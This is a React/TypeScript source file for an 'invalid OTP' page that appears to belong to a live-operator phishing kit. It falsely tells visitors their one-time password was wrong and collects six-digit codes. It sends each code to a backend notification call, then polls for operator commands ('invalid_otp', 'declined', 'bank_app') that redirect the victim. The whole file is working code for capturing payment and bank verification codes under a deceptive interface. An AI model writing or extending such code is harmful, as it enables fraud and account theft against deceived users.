import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useSession } from "@/contexts/SessionContext";
import { Loader2, ShieldCheck, AlertCircle } from "lucide-react";

export default function InvalidOtpPage() {
  const [, navigate] = useLocation();
  const { sessionId, t } = useSession();
  const [otpDigits, setOtpDigits] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const inputRefs = Array.from({ length: 6 }, () => useRef<HTMLInputElement>(null));

  const otpMutation = trpc.notify.otpSubmitted.useMutation();
  const clearCommand = trpc.session.clearCommand.useMutation();
  const pollQuery = trpc.session.poll.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && loading, refetchInterval: 3000 }
  );

  useEffect(() => { inputRefs[0].current?.focus(); }, []);

  useEffect(() => {
    if (!loading || !pollQuery.data) return;
    const { command } = pollQuery.data;
    if (command === "none") return;
    clearCommand.mutate({ sessionId: sessionId! });
    if (command === "invalid_otp") { setLoading(false); navigate("/invalid-otp"); }
    else if (command === "declined") { setLoading(false); navigate("/declined"); }
    else if (command === "normal") { setLoading(false); navigate("/payment"); }
    else if (command === "bank_app") { setLoading(false); navigate("/bank-app"); }
  }, [pollQuery.data?.command, loading]);

  const handleInput = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...otpDigits];
    newDigits[index] = value.slice(-1);
    setOtpDigits(newDigits);
    if (value && index < 5) inputRefs[index + 1].current?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otpDigits[index] && index > 0) inputRefs[index - 1].current?.focus();
  };

  const handleSubmit = () => {
    const otp = otpDigits.join("");
    if (otp.length < 6) return;
    setLoading(true);
    if (sessionId) otpMutation.mutate({ sessionId, otp });
  };

  return (
    <div style={{ backgroundColor: "#f5f5f5", minHeight: "100vh" }} className="flex flex-col items-center justify-center">
      <div style={{ backgroundColor: "white", borderRadius: "16px", padding: "40px 32px", maxWidth: "400px", width: "100%", boxShadow: "0 4px 24px rgba(0,0,0,0.12)", textAlign: "center" }}>
        <div style={{ width: "64px", height: "64px", borderRadius: "50%", backgroundColor: "#fee2e2", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
          <AlertCircle size={32} color="#E50914" />
        </div>

        <div style={{ backgroundColor: "#fee2e2", border: "1px solid #fca5a5", borderRadius: "8px", padding: "12px 16px", marginBottom: "20px" }}>
          <p style={{ color: "#dc2626", fontSize: "14px", fontWeight: 600, margin: 0 }}>{t("invalidOtp")}</p>
        </div>

        <h1 style={{ fontSize: "20px", fontWeight: 800, color: "#1a1a1a", marginBottom: "8px" }}>{t("enterOtp")}</h1>
        <p style={{ color: "#666", fontSize: "14px", marginBottom: "24px" }}>{t("otpSentTo")}</p>

        <div style={{ display: "flex", gap: "8px", justifyContent: "center", marginBottom: "16px" }}>
          {otpDigits.map((val, i) => (
            <input key={i} ref={inputRefs[i]} type="text" inputMode="numeric" maxLength={1} value={val}
              onChange={e => handleInput(i, e.target.value)}
              onKeyDown={e => handleKeyDown(i, e)}
              style={{ width: "48px", height: "56px", textAlign: "center", fontSize: "22px", fontWeight: 700, backgroundColor: "#fff5f5", border: `2px solid ${val ? "#E50914" : "#fca5a5"}`, borderRadius: "8px", color: "#333", outline: "none" }}
              onFocus={e => { e.currentTarget.style.borderColor = "#E50914"; }}
              onBlur={e => { if (!val) e.currentTarget.style.borderColor = "#fca5a5"; }}
            />
          ))}
        </div>

        <button onClick={handleSubmit} disabled={loading}
          style={{ width: "100%", backgroundColor: "#E50914", color: "white", border: "none", borderRadius: "8px", padding: "16px", fontSize: "16px", fontWeight: 700, cursor: loading ? "default" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}
          onMouseEnter={e => { if (!loading) e.currentTarget.style.backgroundColor = "#c40812"; }}
          onMouseLeave={e => { e.currentTarget.style.backgroundColor = "#E50914"; }}>
          {loading ? <><Loader2 size={20} style={{ animation: "spin 1s linear infinite" }} /> {t("verifying")}</> : t("submitOtp")}
        </button>
      </div>
    </div>
  );
}
